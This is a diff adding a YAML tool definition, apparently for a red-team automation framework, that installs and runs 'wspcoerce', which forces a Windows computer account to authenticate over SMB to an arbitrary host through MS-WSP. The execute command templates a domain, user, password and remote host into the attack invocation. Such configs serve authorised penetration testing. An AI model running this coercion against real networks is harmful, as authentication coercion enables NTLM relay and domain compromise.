@@ -1,0 +1,31 @@
+name: wspcoerce
+description: >
+ wspcoerce coerces a Windows computer account via SMB to an arbitrary target using MS-WSP
+author: "RedTeamPentesting"
+version: "0.0.1"
+enabled: true
+params:
+   - name: domain
+     type: string
+     required: false
+     description: domain to use in the script
+   - name: start_user
+     type: string
+     required: false
+     description: start_user to use in the script
+   - name: start_pass
+     type: string
+     required: false
+     description: start_pass to use in the script   
+   - name: rhost
+     type: string
+     required: false
+     description: rhost to use in the script          
+tool:
+  name: wspcoerce
+  repo_url: https://github.com/RedTeamPentesting/wspcoerce.git
+  install_path: external/.exploit/wspcoerce
+  install_command: |
+   pip3 install .
+  execute_command: |
+    wspcoerce '{{ domain }}/{{ start_user }}:{{ start_pass }}@{{ rhost }}' "file:////{{ domain }}/IT"
